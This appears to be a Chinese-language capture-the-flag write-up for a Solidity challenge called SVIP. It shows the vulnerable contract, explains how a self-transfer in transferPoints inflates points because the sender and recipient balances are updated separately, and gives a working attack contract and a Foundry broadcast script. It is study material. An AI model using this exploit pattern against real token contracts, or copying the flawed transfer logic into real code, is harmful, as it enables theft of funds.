# SVIP

# 源码

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

contract SVIP {
    mapping(address => uint256) public points; // 分数
    mapping(address => bool) public isSuperVip;
    uint256 public numOfFree;
    bool cross;

    constructor() {}

    function promotionSVip() public {
        require(
            points[msg.sender] >= 999,
            "Sorry, you don't have enough points"
        );
        isSuperVip[msg.sender] = true;
    }

    function getPoint() public {
        require(numOfFree < 100);
        points[msg.sender] += 1;
        numOfFree++; //最多领100
    }

    function transferPoints(address to, uint256 amount) public {
        uint256 tempSender = points[msg.sender]; //100
        uint256 tempTo = points[to]; //100
        require(tempSender > amount);
        require(tempTo + amount > amount);
        points[msg.sender] = tempSender - amount; //
        points[to] = tempTo + amount; //
    }

    function check() external {
        require(isSuperVip[msg.sender] == true, "no");
        cross = true;
    }

    function isSolved() external view returns (bool) {
        require(cross == true);
        return true;
    }
}

```

# 题目分析

issolved是让isSuperVip\[msg.sender] == true

有一个领空投的函数`getPoint()`，每个人最多领100

然后顺着涉及`isSuperVip[msg.sender]`的有`promotionSVip()`函数，只要满足这个函数的require条件就能成为svip，require条件是<font style="background-color:#FBDFEF;">points\[msg.sender] >= 999</font>，而上边领空投最多只能领100，找找有没有别的方式还能加mapping的，那就找到了`transferPoints()`函数，正常是一个人转给另一个人，但是这里可以看见：

1. 没有限制to的地址
2. from和to的mapping是分别更新的

那么这样，就有了一个攻击漏洞点，类似于transferfrom的from和to填同一个账户地址，我们这里也是，自己给自己转，虽然前一步mapping减掉了，但后一步还会在原来没减的基础上再加amount这么多，然后再多循环几次，领到999就可以满足require条件，成为svip

## 攻击步骤

1. 循环领100次空投
2. 循环10次每次给自己转99
3. 调用`promotionSVip()`成为svip

# poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {SVIP} from "./SVIP.sol";

contract Attack {
    SVIP svip;

    function attack(address addr) external {
        svip = SVIP(addr);
        uint256 left = 100 - svip.numOfFree();
        for (uint256 i = 0; i < left; i++) {
            svip.getPoint();
        }
        for (uint256 i = 1; i <= 10; i++) {
            svip.transferPoints(address(this), 99);
        }
        svip.promotionSVip();
        svip.check();
        svip.isSolved();
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Attack} from "../src/Attack.sol";
import {Script} from "forge-std/Script.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack();
        attack.attack(0x8e272DeBecAB226AF8Bd2f9CC0D0cBa2D9222B35);
        vm.stopBroadcast();
    }
}

```


> 更新: 2025-08-09 19:07:38  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/ibguh9yovxlgoq6y>